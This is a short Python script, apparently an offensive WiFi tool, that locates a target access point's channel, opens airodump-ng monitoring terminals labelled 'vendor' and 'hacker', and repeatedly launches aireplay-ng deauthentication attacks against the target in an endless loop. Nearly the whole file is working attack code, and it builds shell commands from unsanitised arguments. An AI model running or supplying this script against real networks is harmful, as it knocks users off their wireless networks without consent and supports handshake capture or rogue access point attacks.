#!/usr/bin/env python
import subprocess
import os
import time
import sys
vb=sys.argv[1]
uyku=sys.argv[2]
attack=sys.argv[3]
hb=sys.argv[4]
def find_channel(bssid):
	while True:
		proc = subprocess.Popen('iwlist scan 2>/dev/null',shell=True,stdout=subprocess.PIPE, )
		stdout_str = proc.communicate()[0]
		stdout_list=stdout_str.split('Cell')
		essid=[]
		address=[]
		for line in stdout_list:
			if bssid in line:
				for linee in line.split('\n'):
					if "Channel" in linee:
						return linee.split(':')[1]

def open_terminal(bssid,channel,title,zoom,geometry):
	os.system('gnome-terminal --zoom ' + zoom + ' --geometry ' + geometry + ' -e "airodump-ng mon0 --bssid ' + bssid + ' --channel ' + channel + '" --title "' + title + '"')
open_terminal(vb,find_channel(vb),"vendor","0.8","84x18")
open_terminal(hb,find_channel(vb),"hacker","0.8","163x16")
while True:
	islem=os.system("aireplay-ng -0 " + attack + " -a " + vb + " mon0")
	if (islem != 0):
		os.system("pkill airodump-ng")
		open_terminal(vb,find_channel(vb),"vendor","0.8","84x18")
		open_terminal(hb,find_channel(vb),"hacker","0.8","163x16")
	else:
		time.sleep(int(uyku))
